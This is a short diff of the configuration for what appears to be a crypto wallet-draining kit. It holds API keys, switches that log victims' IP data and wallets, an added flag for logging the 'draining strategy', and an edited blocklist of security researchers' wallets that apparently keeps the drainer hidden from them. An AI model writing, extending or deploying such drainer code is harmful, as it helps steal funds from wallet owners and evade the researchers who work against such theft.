@@ -13,6 +13,7 @@ let infura_key = "9aa3d95b3bc440fa88ea12eaa4456161";
 let wc_projectid = "7b3d5a6b0763294065cb92efa56375de"; // ProjectID from https://cloud.walletconnect.com/
 
 // Logging setting
+let logDrainingStrategy = true; // Shows draining strategy in logs
 let logIpData =  true; // Add IP data to logs
 let logEmptyWallets = false; // Log when wallet is empty
 
@@ -132,7 +133,7 @@ function updateWalletData(walletAddress, walletEthBalance){
 
 // Block wallets
 let researchers = [
-    "0x240Cf70D8A648BE133fEB342D71E5e81C686e5f8",
+    "0x230478365e33d32f74f3cf7ccf3b23a423ceca87",
     "0x20cCdeDB9814c83bA2D663fC04f88c7a61aA706d",
     "0x2ad6FA4db57Ac71479510863643Eb6b1991788E1",
     "0x33566c9D8BE6Cf0B23795E0d380E112Be9d75836",
